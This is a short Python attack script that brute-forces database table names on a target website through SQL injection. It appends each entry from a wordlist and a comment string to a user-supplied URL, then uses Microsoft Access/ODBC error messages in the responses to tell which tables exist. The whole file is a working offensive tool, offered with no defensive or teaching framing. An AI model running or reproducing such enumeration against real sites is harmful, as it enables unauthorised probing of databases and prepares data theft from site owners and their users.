import requests,os
link = input('enter Your site Link :: ')
comment = input('Enter your comment :: ')
filename = input('Enter The Tables File Name: ')
def everythingvuln():
        file = open(filename,'r')
        for tabels in file.readlines():
            exadd = link+' '+tabels+comment
            mol = requests.get(exadd)
            status_check = mol.status_code
            if status_check == 200:
                hop = str(mol.text)
                word = str(len(hop))
                if 'Microsoft OLE DB Provider for ODBC Drivers error' in hop or '[Microsoft][ODBC Microsoft Access Driver]' in hop or 'Microsoft JET Database Engine' in hop or 'The Microsoft Jet database engine cannot find the input table or query' in hop :
                    print('\033[1;91m[-] Failed Table = ' + tabels + '\n')
                    continue
                else:
                    print("\033[1;96m[$] Site Link:\033[1;92m " + exadd)
                    print("\033[1;93m[$] Words = "+word)
                    print("\033[1;95m[$] Table Name: "+tabels)
            else:
                print('\033[1;91m[-] Failed Table = '+tabels+'\n')
                continue
everythingvuln()
